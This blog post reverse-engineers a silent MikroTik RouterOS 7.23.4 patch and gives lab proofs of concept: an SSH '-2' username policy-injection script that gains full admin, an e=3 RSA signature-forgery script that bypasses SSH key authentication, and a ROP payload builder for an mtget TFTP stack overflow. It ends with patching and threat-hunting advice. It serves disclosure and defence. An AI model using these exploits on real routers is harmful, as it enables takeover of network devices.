# extract: served via trafilatura-direct
---
title: "Reversing MikroTik's Silent Patch: The RouterOS 7.23.4 Fix They Wouldn't Explain | Nick Pratley"
author: Nick
url: https://npratley.net/reversing-mikrotiks-silent-patch-the-routeros-7-23-4-fix-they-wouldnt-explain/
hostname: npratley.net
description: This was AI driven, and verified in a lab, 6 hours vs what would generally take weeks to months of work – why use your hands when you own a shovel or a post hole digger. On the 3rd of September 2026, MikroTik quietly pushed RouterOS 7.23.4 (long-term), 7.24.2 (stable) and 6.49.21 (v6) all on […]
sitename: Nick Pratley
date: "2026-09-04"
categories: ['Linux', 'Networking']
tags: ['MikroTik', 'radare2', 'Reverse Engineering', 'RouterOS', 'Security', 'SSH']
---
On the 3rd of September 2026, MikroTik quietly pushed RouterOS 7.23.4 (long-term), 7.24.2 (stable) and 6.49.21 (v6) all on the same day. Every one of them carried the same banner:

This is an important security update. Most configurations are not at risk, but upgrading is highly recommended. To give time to update your systems, we are not currently publishing detailed information.


Translation: “we found something nasty, we patched it, and we are not going to tell you what it is until enough of you have updated.” Fair enough. Except there is a delicious irony baked into that sentence. If you ship the fixed binaries to the entire planet, then the diff between old and new *is* the disclosure. The embargo protects the unpatched fleet, not the patched binary sitting on your download mirror.

So let us do what any operator running a fleet of these should do: pull both versions, reverse the delta, and work out what changed. This post is the full walk from static diff to reproduced code execution. There are three real bugs here, and two conditional chains. One is the low-exponent RSA signature forgery into the `mtget` overflow. The other—now matched to an active-exploitation support trace—is an SSH username of `-2` reaching a legacy file-descriptor login transport, letting an authenticated read-only session supply its own full policy mask. That second path gives full RouterOS command execution and can in turn reach `mtget`. What I have *not* reproduced is a stock, credential-free way to make SSH accept literal user `-2` in the first place; that boundary matters, and this revision keeps it explicit.

## **The one line they hoped you would skim past**

Every RouterOS release dumps a wall of “improve stability” bullet points. The trick with a silent security release is to find the entry that appears in *all* maintained branches on the same day, because a coordinated cross-branch backport is the fingerprint of a single serious fix. Diffing the changelogs, exactly one line qualifies:

`*) ssh - refactor SSH internal processes and improved system stability;`
Present in 7.23.4, 7.24.2 and 6.49.21. Absent from 7.23.3. That is our thread to pull.

## **Getting the bits out of an NPK**

RouterOS ships as NPK (“Nova Package”) files. I grabbed the x86 base package for the patched and the previous release, about 20MB each, no auth needed:

```
curl -O https://download.mikrotik.com/routeros/7.23.4/routeros-x86-7.23.4.npk
curl -O https://download.mikrotik.com/routeros/7.23.3/routeros-x86-7.23.3.npk
```
An NPK is a custom container: a 4-byte magic (`1E F1 D0 BA`), a run of TLV parts, a signature block, and the interesting bit, a squashfs payload. binwalk finds the filesystem for us:

```
$ binwalk routeros-x86-7.23.4.npk
DECIMAL   HEXADECIMAL   DESCRIPTION
4096      0x1000        SquashFS filesystem, little endian, version 4.0,
                        compression: xz, size: 16650908 bytes
```
Standard squashfs 4.0 with xz. Carve from offset 0x1000 and unsquash it. My host was missing `unsquashfs`, so a throwaway Alpine container did the honours:

```
dd if=routeros-x86-7.23.4.npk of=root.sqsh bs=4096 skip=1
docker run --rm -v "$PWD":/w -w /w alpine:3 sh -c 
  'apk add squashfs-tools >/dev/null; unsquashfs -d rootfs root.sqsh'
```
RouterOS is not one monolithic daemon. It is a swarm of small “nova” processes under `/nova/bin/` talking over an internal message bus, brokered by a master `loader` process. The SSH server lives in a bundle, and interestingly the client and server are the same binary:

```
rootfs/bndl/security/nova/bin/sshd    <- SSH server (byte-identical to ssh)
rootfs/lib/libucrypto.so              <- crypto primitives
rootfs/lib/libumsg.so                 <- message bus + login handling
```
## **Diffing at the symbol level, not the byte level**

A naive `cmp` of the two `sshd` binaries reports 170KB of differences, which is useless noise. Insert a few bytes near the top of `.text` and every address downstream shifts, so the whole file “changes”. The signal is not in the bytes, it is in the *symbols*. Stripped or not, the dynamic symbol table survives, and a diff of exported and imported symbols cuts straight to intent.

One trap worth mentioning: BusyBox `sh` in Alpine has no process substitution, so `diff <(...) <(...)` silently compares two empty streams and reports everything as identical. That will happily convince you nothing changed. Temp files and `comm` instead:

```
nm -D old/$bin | awk '{print $NF}' | sort -u > a
nm -D new/$bin | awk '{print $NF}' | sort -u > b
comm -13 a b   # added in the new build
comm -23 a b   # removed
```
Run that across every changed ELF and the story falls out. Two shared libraries changed, and the same handful of symbols move together across a whole cluster of binaries:

```
### lib/libumsg.so
  + _Z20validLoginParamInput11string_view
### lib/libucrypto.so
  + _ZN12RsaPublicKey23parseHashFromDerEncodedE6HashIDN4asn14blobE
  - _ZN12RsaPublicKey23parseHashFromDerEncodedEjN4asn14blobE
### referencing the changed RSA routine:
  sshd/ssh, ipsec, ipsec-worker, ssld, cloud
```
The SSH-focused symbol diff exposes two pieces: a new `validLoginParamInput` on the terminal-login paths and a changed `parseHashFromDerEncoded` in the RSA path. A wider sweep of every changed ELF exposes the third: `nova/bin/mtget` adds `snprintf` and the error `Filename too long`. The important correction is that the validator is not cosmetic hardening: in interactive SSH it closes a trusted-argv/policy injection, while `mtget` is the independently reachable native-process memory-corruption primitive.

## **Piece one: `-2` is a file descriptor, not a username**

`-2` is a file descriptor, not a username
The new `validLoginParamInput` function accepts only a non-empty value which does not begin with `-` or a space, does not end with a space, and contains no control byte or DEL. My first pass correctly identified characteristic argv hardening, then stopped at the wrong process. The authentication backend, `nova/bin/user`, does not execute anything and is byte-identical between these releases. The sink is one process later: `/nova/bin/login`.

```
sshd 7.23.3, simplified:
execl("/nova/bin/login", "login",
      "-ssh", "-trace", trace,
      "-h"/"-mac", peer,
      "-c", command,
      authenticated_name, decimal_policy_mask, NULL)
```
Those final two values are standalone positional arguments. The unchanged `login` parser has a legacy internal transport: if a positional begins with `-`, strip the dash, parse the rest with `atoi`, accept descriptors 0 through 32, read at most 4096 bytes from that descriptor, require a final NUL, and split the buffer into two NUL-delimited fields. It is how `mepty` can pass trusted login material through a pipe without exposing it in argv.

```
if positional[0] == '-':
    fd = atoi(positional + 1)
    blob = read_until_eof(fd, maximum=4096)
    require blob[-1] == 0
    field1 = blob before first NUL
    field2 = blob after first NUL
```
For an interactive SSH session, fds 0, 1 and 2 are duplicates of the PTY slave. Therefore an SSH username of `-2` means “replace the trusted login positionals by reading stderr/PTY fd 2”. The second replacement field goes through `strtoul(..., 10)` and becomes the authorization policy mask. It is not a password and it is not a random per-session handle.

### **The terminal detail that made the exploit look dead**

A PTY is normally in canonical mode. Sending 4096 NULs does not cleanly terminate the read; the line discipline continues waiting, and a later Enter makes the final byte a newline, which the parser rejects. The correct framing is two NUL-terminated fields followed by two terminal VEOF bytes (`0x04 0x04`): the first VEOF delivers the pending buffer without adding a byte, and the second makes the next read return EOF.

```
0\x00 654958\x00 \x04\x04
^     ^             ^
|     |             two canonical-terminal EOFs
|     RouterOS full policy mask (0x9fe6e)
first replacement field
```
### **Reproduced: read-only SSH to full RouterOS administration**

RouterOS normally refuses to create a local account named `-2`, so I used a disposable RADIUS responder restricted to that exact username to isolate the post-authentication boundary. SSH recorded the outer identity as `-2`, group `read`. After the fd-2 block above, RouterOS opened this console:

```
[654958@CHR] > :put [/system identity get name]
CHR
# reversible write proof
/system identity set name=minus2-proof
:put [/system identity get name]
minus2-proof
/system identity set name=CHR
```
`654958` is `0x9fe6e`, RouterOS’s normalized full policy set. An all-ones 32-bit value is clamped to that same set. This was not merely an odd prompt: the outer read-only session performed write and policy actions. I then created and immediately removed the exact campaign-shaped account, producing:

```
user ops added by ssh:-2@172.31.88.5
  (*2 = /user add group=full name=ops)
user ops removed by ssh:-2@172.31.88.5/action:0
  (/user remove *2)
```
That is the same unusual pair reported from an affected router: configuration changes attributed to `ssh:-2@<address>`, followed by an `ops` user in `full`. It is a strong behavioural match to this path, not just a shared string IOC.

### **Focused lab PoC**

This client is deliberately restricted to loopback or RFC1918 targets. Its default RouterOS command is read-only. The SSH layer must already accept literal username `-2`; in my lab that acceptance was supplied by the scoped RADIUS responder.

```
#!/usr/bin/env python3
"""Lab-only RouterOS <=7.23.3 SSH ``-2`` PTY policy-injection proof.
The SSH authentication layer must first accept the literal username ``-2``.
In the documented lab this is done with a deliberately scoped RADIUS server.
The default command is read-only.  Targets are restricted to loopback/RFC1918.
"""
from __future__ import annotations
import argparse
import ipaddress
import re
import socket
import time
import paramiko
ANSI = re.compile(rb"\x1b(?:\[[0-?]*[ -/]*[@-~]|.)")
RFC1918 = tuple(
    ipaddress.ip_network(value) for value in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
)
def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("--port", type=int, default=22)
    parser.add_argument("--password", required=True)
    parser.add_argument("--effective-name", default="0")
    parser.add_argument("--policy-mask", type=int, default=0xFFFFFFFF)
    parser.add_argument("--command", default=":put [/system identity get name]")
    parser.add_argument("--timeout", type=float, default=20.0)
    args = parser.parse_args()
    address = ipaddress.ip_address(socket.gethostbyname(args.host))
    if not (address.is_loopback or any(address in network for network in RFC1918)):
        parser.error("target must be loopback or RFC1918 lab address")
    if not 0 <= args.policy_mask <= 0xFFFFFFFF:
        parser.error("--policy-mask must fit in an unsigned 32-bit integer")
    if "\x00" in args.effective_name:
        parser.error("--effective-name cannot contain NUL")
    sock = socket.create_connection((args.host, args.port), timeout=10)
    transport = paramiko.Transport(sock)
    output = bytearray()
    try:
        transport.start_client(timeout=10)
        transport.auth_password("-2", args.password, fallback=False)
        channel = transport.open_session(timeout=10)
        channel.get_pty(term="vt100", width=80, height=24)
        channel.invoke_shell()
        # RouterOS login treats argv strings beginning with '-' as '-<fd>'.
        # Two NUL-delimited fields replace the normal name/policy positionals.
        # Two VEOF bytes make the canonical PTY return the block and then EOF.
        block = (
            args.effective_name.encode()
            + b"\x00"
            + str(args.policy_mask).encode()
            + b"\x00\x04\x04"
        )
        channel.sendall(block)
        deadline = time.monotonic() + args.timeout
        answered_decid = False
        answered_cpr = False
        command_sent = False
        while time.monotonic() < deadline:
            if channel.recv_ready():
                output.extend(channel.recv(4096))
                if not answered_decid and b"\x1bZ" in output:
                    channel.sendall(b"\x1b[?1;2c")
                    answered_decid = True
                if not answered_cpr and b"\x1b[6n" in output:
                    channel.sendall(b"\x1b[24;1R")
                    answered_cpr = True
                if not command_sent and b"] > " in ANSI.sub(b"", output):
                    channel.sendall(args.command.encode() + b"\r")
                    command_sent = True
            plain = ANSI.sub(b"", bytes(output))
            if command_sent and plain.count(b"] > ") >= 2:
                break
            if channel.closed:
                break
            time.sleep(0.05)
        while channel.recv_ready():
            output.extend(channel.recv(4096))
        clean = ANSI.sub(b"", bytes(output)).replace(b"\r", b"")
        print(clean.decode(errors="replace"))
        if b"invalid user input" in clean:
            print("patched control: username rejected before login child")
            return 2
        if not command_sent:
            print("no injected RouterOS prompt observed")
            return 1
        return 0
    finally:
        transport.close()
if __name__ == "__main__":
    raise SystemExit(main())
```
```
$ python3 routeros_minus2_pty_poc.py 172.31.88.2 --password x
0^@4294967295^@
[654958@CHR] > :put [/system identity get name]
CHR
[654958@CHR] >
$ python3 routeros_minus2_pty_poc.py 172.31.88.3 --password x
invalid user input
patched control: username rejected before login child
```
### **What 7.23.4 fixes—and what remains unknown**

7.23.4 validates the stored SSH username before spawning the interactive login child. Literal `-2` is rejected with `invalid user input`; no trusted fd parser and no RouterOS console follows. This is the direct fix.

The exploit still begins after SSH user authentication. In a clean local-auth lab, `-2` was rejected with the correct `admin` password, an RSA key authorized to `admin`, numeric/dash aliases `-0` through `-3`, arbitrary RSA and Ed25519 keys, an attacker-owned `e=3` key, and a forged signature for the built-in Go Daddy `e=3` CA key. SSH `none`, keyboard-interactive, embedded-NUL usernames and post-success username mutation also failed. The changed authentication backend is byte-identical. So this work confirms authenticated read-to-full command execution, but it does not manufacture a stock credential-free way for SSH to accept `-2`. If the field target did not use RADIUS/User Manager or another external AAA path, a separate initial-access primitive remains missing.

RouterOS 7.23.4 also contains explicit incident remediation in `nova/bin/mode`: it recognises an `ops` user in `full`, suspicious fetch/import scheduler entries and campaign domains, disables known-malicious configuration, logs what it found, and sets device mode to `flagged=yes` after reboot. That is consistent with the support report and with an incident-response patch, not generic stability work.

## **Piece two: the RSA signature verifier**

This is the interesting one. `parseHashFromDerEncoded` changed in every consumer that verifies an RSA signature:

```
libucrypto.so          defines it
sshd / ssh             SSH public-key auth        (inbound: verifies the client's signature)
ipsec / ipsec-worker   IKEv2 IKE_AUTH             (inbound: verifies a peer's cert/signature)
ssld                   TLS handshake              (certificate verification; direction varies)
cloud                  ACME / back-to-home        (mostly outbound peer verification)
```
Finding one routine on the verification path of SSH, IKE and TLS is excellent attack-surface discovery. It is not, by itself, proof that any of them is bypassable. Establishing direction matters: for `ipsec` the surrounding strings are `AUTHENTICATION_FAILED`, `peer does not conform to RFC 5996` and `can't verify peer's certificate`, so it is verifying a remote peer during IKE_AUTH, which is attacker-supplied and inbound. For `ssld` it is certificate verification inside the TLS handshake, whose exploitability depends entirely on which direction and which config. For `cloud` it is mostly outbound verification of MikroTik’s own services. So the honest scope is: the same verifier sits under SSH, IPsec and TLS. Whether each is bypassable is a separate question per protocol.

Now the routine itself. It extracts the hash digest out of the DER `DigestInfo` inside a PKCS#1 v1.5 signature. It enters by checking the tag is `0x30` (SEQUENCE), which tells us the PKCS#1 padding has already been stripped upstream. So the full picture is two layers: the caller strips `00 01 FF..FF 00`, then this routine parses what is left.

### **The caller: the padding check, corrected**

`libucrypto` exposes no one-shot RSA verify here. The SSH binary performs `signature^e mod n`, serialises the result to the modulus width, strips the PKCS#1 v1.5 envelope, and passes the remaining `DigestInfo` to `parseHashFromDerEncoded`. The actual 7.23.3 check is:

```
EM = i2osp(signature^e mod n, modulus_bytes)
if next(EM) != 0x00: fail
if next(EM) != 0x01: fail
while peek(EM) == 0xFF: next(EM)
if next(EM) != 0x00: fail
digest = parseHashFromDerEncoded(expected_hash, remaining_EM)
return digest == calculated_digest
```
My previous revision said the loop required at least eight `FF` bytes. It does not. I re-read the instructions around `0x805cb95..0x805cbd9` and then tested the result: zero `FF` bytes are accepted. The shortest accepted prefix is therefore `00 01 00`. That is materially weaker than standard EMSA-PKCS1-v1_5 and gives a low-exponent forgery much more room.

### **What 7.23.4 actually added**

The old DER routine checks the outer SEQUENCE, the hash OID and the digest OCTET STRING, then returns the digest span. It never asks whether anything remains after that object. The SSH caller does compare the returned span byte-for-byte with the calculated digest, so the old missing digest-length check is redundant in this particular caller. The ignored tail is not redundant.

```
; 7.23.4, after extracting the digest
cmp  dword [ebp-0x28], 0x100   ; DER reader's clean-EOF sentinel
jne  reject_trailing_bytes
; expected digest sizes: 16,20,28,32,48,64
movzx expected_len, byte [hash_length_table + hash_id]
cmp   actual_digest_len, expected_len
jne   reject_bad_digest_length
```
The `0x100` value is a parser sentinel, not a 256-byte RSA modulus check. The corresponding parser writes `0x100` at clean EOF and `0x101` on truncation. In plain English, 7.23.4 says: the expected digest must be exactly the expected length, and it must be the final thing in the encoded message.

## **Lab proof one: SSH authentication without the private key**

I stopped here in the earlier revision because static analysis had reached its honest limit. The experiment is now done. I ran 7.23.3 and 7.23.4 CHR side by side in local Docker/QEMU, created the same low-privilege user on both, and imported the same 2048-bit RSA public key with exponent `e=3`. The client retained only the public key for signing purposes.

The forgery builds the prefix below, pads the low end of the 2048-bit integer with zeroes, and takes the integer cube root rounded up:

`00 01 00 || DER(SHA-256 DigestInfo) || SHA256(SSH session blob) || garbage`
Because `e=3`, verification cubes the forged signature. The high-order checked prefix survives the rounding; the error lands in the low-order garbage which 7.23.3 ignores. No private-key operation occurs.

```
#!/usr/bin/env python3
# forge_e3_ssh.py -- lab PoC, deliberately restricted to loopback
import argparse, base64, hashlib, ipaddress, socket
from pathlib import Path
import paramiko
from paramiko.message import Message
DI_SHA256 = bytes.fromhex("3031300d060960864801650304020105000420")
def cbrt_floor(n):
    lo, hi = 0, 1 << ((n.bit_length() + 2) // 3 + 1)
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        if mid ** 3 <= n: lo = mid
        else: hi = mid
    return lo
def forge(data, modulus_bytes):
    digest = hashlib.sha256(data).digest()
    prefix = b"\x00\x01\x00" + DI_SHA256 + digest
    target = int.from_bytes(prefix + b"\x00" * (modulus_bytes-len(prefix)), "big")
    s = cbrt_floor(target) + 1
    recovered = (s ** 3).to_bytes(modulus_bytes, "big")
    assert recovered.startswith(prefix)
    return s.to_bytes(modulus_bytes, "big")
class ForgedRSAKey(paramiko.RSAKey):
    def sign_ssh_data(self, data, algorithm=None):
        assert algorithm == "rsa-sha2-256"
        m = Message()
        m.add_string(algorithm)
        m.add_string(forge(bytes(data), self.get_bits() // 8))
        return m
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--public-key", type=Path, required=True)
    ap.add_argument("--user", default="forge")
    ap.add_argument("--command-file", type=Path)
    args = ap.parse_args()
    assert ipaddress.ip_address("127.0.0.1").is_loopback
    fields = args.public_key.read_text().split()
    key = ForgedRSAKey(data=base64.b64decode(fields[1]))
    assert key.key.public_numbers().e == 3
    command = (args.command_file.read_text().strip() if args.command_file
               else ":put [/system resource get version]")
    sock = socket.create_connection(("127.0.0.1", args.port), timeout=10)
    t = paramiko.Transport(sock, disabled_algorithms={"pubkeys": ["rsa-sha2-512"]})
    t.start_client(timeout=10)
    try:
        t.auth_publickey(args.user, key)
    except paramiko.AuthenticationException:
        print("authentication rejected")
        return 1
    ch = t.open_session(timeout=10)
    ch.settimeout(15)
    ch.exec_command(command)
    try:
        print(ch.makefile("rb").read().decode(), end="")
    except socket.timeout:
        print("authenticated; command channel died with the target service")
    finally:
        t.close()
if __name__ == "__main__": raise SystemExit(main())
```
With `paramiko==5.0.0`, the results were unambiguous:

```
$ python3 forge_e3_ssh.py --port 3223 --public-key e3.pub
7.23.3 (stable)
$ python3 forge_e3_ssh.py --port 2224 --public-key e3.pub
authentication rejected
```
That is an end-to-end SSH authentication bypass for the stated precondition: a known RSA `e=3` public key is already authorized for the target account. It is not “bring any e=3 key and become admin”, and it is not a general `e=65537` break. Public keys are not secrets, but an attacker still needs the specific authorized key.

## **Piece three: the mtget TFTP pathname overflow**

The wider ELF sweep found the piece I had initially waved away as a one-line `sprintf` hardening. In `nova/bin/mtget`, the vulnerable TFTP request builder is much worse: 7.23.3 copies the caller-controlled remote pathname into a fixed stack packet with an unbounded `rep movsb`, then appends mode and option strings after it.

```
; 7.23.3 mtget, simplified
lea  dst, [ebp-0x21a]       ; fixed stack TFTP request buffer + opcode
mov  ecx, remote_path.len
mov  esi, remote_path.ptr
rep  movsb                  ; no comparison with buffer capacity
mov  byte [dst+len], 0
...append "octet", "blksize", "4096"...
```
7.23.4 replaces this with a remaining-capacity cursor, checked appends, `snprintf`, and a new user-visible error: `Filename too long`.

The pathname comes from an authenticated RouterOS command, not from the TFTP server:

`/tool fetch url="tftp://10.0.2.2/<attacker path>" keep-result=no`
That makes this a post-auth bug on its own, but it is reachable with the `test` policy. RouterOS’s built-in `read` group includes `ssh,read,test` and excludes `write,policy`. A supposedly read-only operator can reach the vulnerable process.

### **From crash to controlled EIP**

The same 700-byte pathname was sent to both builds. 7.23.4 returned `failure: Filename too long`. On 7.23.3, the command channel hung, RouterOS generated `autosupout.rif` for a service malfunction, and the router itself stayed alive. Decoding the support file locally produced:

```
/nova/bin/mtget
--- signal=11 ---
eip=0x41414141 eflags=0x00010202
edi=0x41414141 esi=0x41414141 ebp=0x41414141 esp=0xffffd820
```
A patterned run with 542 `A`s followed by `BBBB` produced `eip=0x42424241` and a stack beginning `42 43 43 43...`. Saved EIP starts at remote-path offset 541. The binary is NX, but it has no stack canary, is non-PIE at `0x08048000`, and uses partial RELRO. The post-return stack is controlled and stable in this x86 CHR process. That is a straightforward ROP primitive.

### **A deliberately harmless ROP PoC**

I did not pop a shell. The proof creates a disposable file named `rop-sentinel` through the normal CLI, then returns into `mtget`‘s fixed `unlink@plt` and deletes only that file. The next return address is deliberately invalid `0x42424242`, making the completed call visible in the crash record.

```
#!/usr/bin/env python3
# mtget_rop_poc.py -- RouterOS 7.23.3 x86 CHR only
import struct
EIP_OFFSET     = 541
UNLINK_PLT     = 0x0804C250
RETURN_CRASH   = 0x42424242
STACK_AFTER_RET = 0xFFFFD820
MARKER         = b"/rw/disk/rop-sentinel"
def p32(x): return struct.pack("<I", x)
marker_offset = EIP_OFFSET + 12
marker_address = STACK_AFTER_RET + (marker_offset - (EIP_OFFSET + 4))
payload  = b"A" * EIP_OFFSET
payload += p32(UNLINK_PLT)
payload += p32(RETURN_CRASH)
payload += p32(marker_address)
payload += MARKER
safe = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._/"
escaped = "".join(chr(b) if b in safe else f"\\{b:02X}" for b in payload)
print('/tool fetch url=("tftp://10.0.2.2/" . "' + escaped + '") keep-result=no')
```
The post-crash snapshot shows that the function call really executed:

```
eip=0x42424242             ; deliberate return after unlink
esp=0xffffd824             ; advanced through the call
eax=0x00000000             ; unlink() returned success
edx=0xffffd828
stack: 00 00 00 00 2f 72 77 2f 64 69 73 6b 2f 72 6f 70 ...
```
RouterOS’s file count for `rop-sentinel` changed from 1 to 0. This is confirmed controlled code execution in `mtget`, not just a crash or a claimed “probably exploitable” overwrite.

## **Two chains, and the boundary that matters**

The original RSA-to-`mtget` chain remains valid for its stated preconditions:

```
known authorized RSA e=3 public key
  -> forge SSH rsa-sha2-256 signature without its private key
  -> authenticated user with test policy
  -> crafted TFTP pathname
  -> mtget saved-EIP overwrite and fixed-address ROP call
```
The newly closed incident-shaped path is:

```
SSH authentication accepts literal username -2       [precondition]
  -> request interactive PTY shell
  -> login interprets -2 as "read trusted fields from fd 2"
  -> send 0\0 654958\0 VEOF VEOF
  -> full RouterOS administrative command execution  [confirmed]
  -> create ops in group full                         [confirmed]
  -> optionally reach the mtget native ROP primitive
```
The second chain reproduces the field audit fingerprint exactly, but the bracketed first step is not solved by the clean stock lab. Calling the whole campaign unauthenticated would outrun the evidence. Calling the patched username path mere log hardening would now be equally wrong.

## **Scope: serious, conditional, and not magic**

- **Confirmed:** after SSH accepts literal`-2` , a PTY client can replace the trusted policy field and escalate a RouterOS`read` session to the full`0x9fe6e` policy set on 7.23.3.
- **Confirmed:** that session can perform write/policy actions and produces the campaign-shaped`user ops added by ssh:-2@...` record.
- **Confirmed:** 7.23.4 rejects the same PTY path with`invalid user input` .
- **Confirmed:** public-key-only SSH authentication works for an account already bound to a known 2048-bit RSA`e=3` key on 7.23.3; 7.23.4 rejects the forgery.
- **Confirmed:** authenticated`/tool fetch` controls EIP in 7.23.3`mtget` , and a ROP call executes.
- **Not confirmed:** credential-free SSH authentication as literal`-2` on a clean local-user configuration.
- **Not claimed:** a universal RSA`e=65537` break, arbitrary-user login, or an end-to-end IKE/TLS bypass.

The validator now has two separately demonstrated effects. On SSH PTYs it closes a trusted policy/argv injection which produces full RouterOS administrative command execution after authentication as `-2`. On MAC-Telnet it closes the hidden-API/argv selectors below, whose inner authentication and policy checks still hold. `mtget` remains the independently patched native-process ROP primitive.

## **MAC-Telnet: a hidden API tunnel, not unauthenticated RCE**

I went back and ground through the MAC-Telnet path separately because `mactel` is one of the new callers of `validLoginParamInput`. The result is interesting, but it does not close another credential-free RCE chain.

In 7.23.3 the final length-delimited `CP_USERNAME` is passed unchanged as the last argument to `/nova/bin/login`. A leading dash is therefore parsed as a `login` option. Usernames such as `-z`, `-c` and `-d`, even with a wrong EC-SRP password, divert the expected failure path into a fresh `Login:` prompt. This is real pre-auth argv injection, but options needing another argv value cannot be completed: the username is the final argument, and `CP_TERM_TYPE` becomes `TERM`, not another argument.

The more useful selector is the exact seven-byte username `06 2f 6c 6f 67 69 6e`, or `b"\x06/login"`. The leading byte is a RouterOS API word length. On 7.23.3 this selects the API-style login handler and returns `!done =ret=<challenge>` over MAC-Telnet. The identical packet is terminated by 7.23.4.

```
# Used with the public EC-SRP5 mactelnet_client.py in the isolated L2 lab
from mactelnet_client import MACTelnetClient
def api_sentence(*words):
    return b"".join(bytes([len(w)]) + w for w in words) + b"\x00"
c = MACTelnetClient(TARGET_MAC, "\x06/login", "definitely-wrong")
c.connect()                 # 7.23.3 returns an API-style =ret challenge
c.send_data(api_sentence(b"/system/identity/print"))
# response: !fatal, "not logged in"
```
That last response is the boundary. Supplying the correct password to the inner `/login` request produced `!done`, after which `/system/identity/print` returned `=name=CHR`. A disposable user with the correct password but a group containing `local,read,test,ssh` and deliberately omitting `api` was rejected with `std failure: not allowed (9)`. Changing the final username after a valid initial EC-SRP exchange also failed, and an all-zero/low-order client public key did not make the confirmation password-independent.

So the impact is a same-broadcast-domain hidden API transport that bypasses whether the IP API service is enabled, firewalled or address-restricted. It does *not* bypass the RouterOS password database or the account’s `api` policy. With valid credentials it can carry API commands and could reach the `mtget` stage if policy permits; without them, I did not obtain a console, API session or command execution. Calling this MAC-Telnet RCE would be wrong.

The 7.23.4 validator matches that result exactly. It rejects empty input, a leading dash or space, a trailing space, control bytes `00..1f`, and `7f` before opening the PTY. That blocks both the argv forms and `x06/login`.

## **Other fixes hiding in the same diff**

- `www` adds`suspicious skin path` , rejects`/../` and paths escaping the`/rw/disk` user-file root with HTTP 403: path-traversal hardening.
- SSH/SCP adds `destination is an invalid path!` around recursive destination processing: authenticated file-path hardening.
- `diskd` adds explicit truncated-request, truncated-read and oversized-response checks around local RPC frames.
- DHCP replaces small diagnostic `sprintf` calls with bounded formatting and adds allocation/packet-size failure paths. I found robustness and out-of-bounds-read hardening there, not evidence for a separate unauthenticated DHCP RCE.

## **What to actually do**

- **Patch now:** 7.23.4 long-term, 7.24.2 stable, 6.49.21 v6, or a later release containing these fixes.
- If `/system/device-mode/print` shows`flagged: yes` , treat the router as potentially compromised. Preserve logs/support output, inspect all configuration and strongly consider a clean rebuild rather than trusting only automatic cleanup.
- Hunt for an unexpected `ops` user or full-policy account; audit records containing`ssh:-2@` ; scheduler entries combining`fetch` ,`/poll/<UUID>` and`import` ; the domains`mythtime.xyz` ,`leappoach.info` and`eeongous.com` ; and unexpected`/ip socks` enablement.
- Review `/user aaa` , RADIUS and User Manager configuration. This revision proves what happens after SSH accepts`-2` ; external AAA is one concrete way that otherwise-invalid identity can exist.
- Restrict SSH to the management plane and rotate administrative passwords, RADIUS secrets and authorized keys after any suspected exposure.
- Audit imported SSH RSA keys for exponent 3. Replace legacy low-exponent keys with Ed25519/ECDSA or RSA `e=65537` .
- Remove `test` from users that do not need diagnostic tools. RouterOS’s built-in`read` group is not harmless when it can reach memory-unsafe helpers.
- Disable Telnet and restrict or disable MAC-Telnet on untrusted layer-2 segments: `/tool mac-server set allowed-interface-list=none` .
- Hunt for unexpected `autosupout.rif` ,`mtget` restarts and abnormally long TFTP URLs.

The lesson, as always, is that silence is not secrecy. If you patch in public, you disclose in public, whether you write the advisory or not. Somebody is going to read the diff. Better it is you, on your own gear, before someone else does it on yours.

Stay patched, and go check your edge boxes. 🐟
